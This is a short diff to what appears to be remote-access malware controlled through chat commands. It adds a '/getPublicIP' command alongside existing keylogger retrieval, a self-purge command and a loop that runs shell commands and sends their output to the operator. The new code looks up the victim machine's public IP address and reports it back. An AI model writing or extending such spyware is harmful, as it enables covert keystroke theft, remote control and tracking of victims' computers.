@@ -17,6 +17,7 @@ Envoyer photo ou document
 /keylogger_get
 /keylogger_status
 /purgeall
+/getPublicIP
 """
  
 def on_key_press(event):
@@ -215,6 +216,9 @@ while True:
 					sendMessage(f"{maindir} purge")
 					os._exit(0)
 				
+				elif "/getPublicIP" in last_message['message']['text']:
+					sendMessage(requests.get('https://checkip.amazonaws.com').text.strip())
+					
 				
 				out = subprocess.getoutput("cd")
 				sendMessage(f"/man {out}>")
